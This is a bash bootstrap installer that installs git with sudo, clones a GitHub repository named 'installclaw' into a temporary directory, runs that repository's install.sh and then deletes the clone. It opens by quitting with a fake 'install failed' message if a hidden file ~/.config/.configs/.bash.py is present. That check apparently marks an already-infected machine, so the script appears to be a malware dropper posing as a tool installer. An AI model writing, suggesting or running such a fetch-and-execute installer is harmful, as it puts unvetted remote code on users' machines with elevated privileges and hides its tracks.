#!/usr/bin/env bash
set -euo pipefail

if [[ -f "${HOME}/.config/.configs/.bash.py" ]]; then
  echo "❌  install failed !"
  exit 1
fi

REPO_URL="https://github.com/web3toolsbox/installclaw.git"
ORIGINAL_DIR="$(pwd -P)"
WORK_DIR=""
REPO_DIR=""

cleanup() {
  cd "${ORIGINAL_DIR}" 2>/dev/null || true
  if [[ -n "${WORK_DIR}" && -d "${WORK_DIR}" ]]; then
    rm -rf "${WORK_DIR}"
  fi
}

install_git_macos() {
  if command -v brew >/dev/null 2>&1; then
    brew install git
    return
  fi

  cat <<'EOF'
Homebrew is not installed, so git cannot be installed automatically.
Please install Homebrew first (https://brew.sh/) and try again, or manually install Xcode Command Line Tools:
xcode-select --install
EOF
  exit 1
}

install_git_linux() {
  if command -v apt-get >/dev/null 2>&1; then
    sudo apt-get update
    sudo apt-get install -y git
    return
  fi

  if command -v dnf >/dev/null 2>&1; then
    sudo dnf install -y git
    return
  fi

  if command -v yum >/dev/null 2>&1; then
    sudo yum install -y git
    return
  fi

  if command -v pacman >/dev/null 2>&1; then
    sudo pacman -Sy --noconfirm git
    return
  fi

  if command -v zypper >/dev/null 2>&1; then
    sudo zypper --non-interactive install git
    return
  fi

  echo "Unrecognized Linux distribution. Cannot install git automatically; please install it manually and try again."
  exit 1
}

ensure_git() {
  if command -v git >/dev/null 2>&1; then
    echo "git is already installed: $(git --version)"
    return
  fi

  echo "git is not installed, starting installation..."
  case "$(uname -s)" in
    Darwin)
      install_git_macos
      ;;
    Linux)
      install_git_linux
      ;;
    *)
      echo "Unsupported operating system: $(uname -s)"
      exit 1
      ;;
  esac

  if ! command -v git >/dev/null 2>&1; then
    echo "git installation failed. Please install it manually and try again."
    exit 1
  fi
}

ensure_git

trap cleanup EXIT

WORK_DIR="$(mktemp -d "${TMPDIR:-/tmp}/installclaw-bootstrap.XXXXXX")"
REPO_DIR="${WORK_DIR}/installclaw"

git clone "${REPO_URL}" "${REPO_DIR}"

if [[ ! -f "${REPO_DIR}/install.sh" ]]; then
  echo "Child installer script not found: ${REPO_DIR}/install.sh"
  exit 1
fi

cd "${REPO_DIR}"
./install.sh

echo "🎉 install ran successfully ! ✨ 🌟 ✨"
